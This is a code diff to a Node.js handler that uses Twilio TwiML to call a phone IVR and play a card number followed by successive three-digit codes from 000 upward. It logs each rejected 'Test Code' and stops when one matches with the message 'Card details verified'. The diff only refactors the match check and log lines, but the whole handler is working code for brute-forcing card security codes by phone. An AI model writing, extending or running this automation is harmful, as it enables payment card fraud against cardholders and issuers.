@@ -118,19 +118,28 @@ export const handleTryCode = async (req, res) => {
     const codeStr = i.toString().padStart(3, '0');
     lastCodeInBatch = codeStr;
 
+    const isMatch = targetWinner && codeStr === targetWinner;
+
     if (i === currentCodeNum && isFirst === 'true') {
       batchLogs.push(`DTMF Sent: ${baseCard}:${codeStr}`);
+      if (isMatch) {
+        batchLogs.push(`✅🎉 Target Test Code matched: ${codeStr}! Card details verified.`);
+      }
       const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
       twiml.pause({ length: waitSeconds });
       twiml.play({ digits: `ww${baseCard}wwwwwwww${codeStr}` });
     } else {
-      batchLogs.push(`IVR says "Incorrect Test Code" for ${codeStr}. Trying next...`);
+      if (isMatch) {
+        batchLogs.push(`✅🎉 Target Test Code matched: ${codeStr}! Card details verified.`);
+      } else {
+        batchLogs.push(`❌IVR says "Incorrect Test Code" for ${codeStr}. Trying next...`);
+      }
       batchLogs.push(`DTMF Sent: ${baseCard}:${codeStr}`);
       twiml.pause({ length: 2 });
       twiml.play({ digits: codeStr });
     }
 
-    if (targetWinner && codeStr === targetWinner) {
+    if (isMatch) {
       reachedWinner = true;
       break; // Stop adding more codes to TwiML once target code is reached!
     }
